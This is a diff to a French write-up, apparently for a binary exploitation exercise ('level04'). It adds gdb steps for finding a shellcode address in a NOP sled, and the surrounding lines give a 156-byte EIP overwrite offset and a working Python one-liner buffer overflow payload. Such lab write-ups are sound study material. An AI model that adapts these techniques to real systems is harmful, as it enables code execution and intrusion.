@@ -32,6 +32,13 @@ En voici un : http://shell-storm.org/shellcode/files/shellcode-73.php
 Nous avons juste besoin de l'offset necessaire pour ecraser EIP, puis de l'adresse de notre shellcode.
 Apres plusieurs tentatives de `print('A'*x)` nous pouvons en deduire que l'offset est de 156.
 
+Il suffit de recuperer l'adresse de notre shellcode :
+
+    $ gdb level04
+    $ start
+    $ x/1000xg $esp
+    -> piocher une adresse dans le NOP-Sled
+
 Nous avons donc notre payload final :
 
 `python -c "print('A'*156 + '\x50\xd8\xff\xff')"`
